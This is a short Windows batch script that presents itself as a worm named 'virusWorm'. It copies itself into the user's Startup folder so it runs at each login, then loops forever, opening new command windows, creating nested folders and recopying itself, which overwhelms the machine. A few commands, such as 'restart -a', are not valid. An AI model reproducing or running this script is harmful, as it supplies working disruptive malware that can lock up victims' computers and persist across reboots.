@echo off
:A
XCOPY "Code.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start
shutdown -a
restart -a
MD virusWorm
CD virusWorm
XCOPY "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Code.bat"
CD virusWorm
goto A

